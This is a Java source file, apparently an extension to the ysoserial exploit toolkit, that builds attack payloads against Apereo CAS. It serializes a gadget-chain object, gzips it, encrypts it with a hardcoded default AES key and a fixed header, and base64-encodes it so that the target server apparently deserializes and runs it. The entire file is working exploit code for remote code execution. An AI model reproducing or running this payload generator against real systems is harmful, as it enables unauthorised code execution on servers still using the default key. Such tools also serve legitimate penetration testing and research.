package ysoserial.features;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.xml.bind.DatatypeConverter;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.UnsupportedEncodingException;
import java.util.Arrays;
import java.util.zip.GZIPOutputStream;

public class GenerateApereo {


    public static byte[] encrypt(byte[] data, String sessionKey, String iv) throws NullPointerException {
        byte[] clearText = null;
        clearText = data;

        byte[] key = DatatypeConverter.parseBase64Binary(sessionKey);
        byte[] ivs = DatatypeConverter.parseBase64Binary(iv);

        try {
            SecretKeySpec skeySpec = getKey(key);
            Cipher cipher;
            if (null != ivs) {
                IvParameterSpec ivParameterSpec = new IvParameterSpec(ivs);
                cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
                cipher.init(Cipher.ENCRYPT_MODE, skeySpec, ivParameterSpec);
            } else {
                cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
                cipher.init(Cipher.ENCRYPT_MODE, skeySpec);
            }
            return cipher.doFinal(clearText);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return clearText;
    }

    private static SecretKeySpec getKey(byte[] Key) throws UnsupportedEncodingException {
        int keyLength = 128;
        byte[] keyBytes = new byte[keyLength / 8];
        Arrays.fill(keyBytes, (byte) 0x0);
        byte[] passwordBytes = Key;
        int length = passwordBytes.length < keyBytes.length ? passwordBytes.length : keyBytes.length;
        System.arraycopy(passwordBytes, 0, keyBytes, 0, length);
        SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
        return key;
    }


    public static String sendpayload(Object payload) throws Exception {
        // 1. payload to writeObject
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = null;

        out = new ObjectOutputStream(bos);
        out.writeObject(payload);
        out.flush();
        byte[] serpayload = bos.toByteArray();


        // 2. bytes array to gzip stream
        ByteArrayOutputStream gzippayload = new ByteArrayOutputStream();
        try {
            GZIPOutputStream zipStream = new GZIPOutputStream(gzippayload);
            try {
                zipStream.write(serpayload);
            } finally {
                zipStream.close();
            }
        } finally {
            gzippayload.close();
        }


        // AES默认密钥
        byte[] sessionKey = {78, -47, -80, -25, 76, 55, -57, -111, -81, -3, -54, 62, 118, 15, 113, 0};

        // 初始化AES向量
        byte[] iv = new byte[16];

        // byte[] execution = DatatypeConverter.parseBase64Binary(b64execution);
        // byte[] suffix = new byte[34];
        //System.arraycopy(execution, 0, suffix, 0, 34);

        // 获取原数据包前34位固定前缀
        byte[] suffix = {0, 0, 0, 34, 0, 0, 0, 16, 114, 66, -6, -48, -70, -12, 77, -45, -21, 21, -118, -52, 88, 99, -9, -126, 0, 0, 0, 6, 97, 101, 115, 49, 50, 56};

        // 编码key
        String baseSessionKey = DatatypeConverter.printBase64Binary(sessionKey);

        // 从前34位中截取iv to base64
        System.arraycopy(suffix, 8, iv, 0, 16);
        String baseIv = DatatypeConverter.printBase64Binary(iv);


        // AES CBC PK7 encrypt encrpyt to payload
        byte[] encryptdata = encrypt(gzippayload.toByteArray(), baseSessionKey, baseIv);

        // suffix + payload
        byte[] result = new byte[encryptdata.length + suffix.length];
        System.arraycopy(suffix, 0, result, 0, suffix.length);
        System.arraycopy(encryptdata, 0, result, suffix.length, encryptdata.length);

        // base64
        return DatatypeConverter.printBase64Binary(result);
    }
}
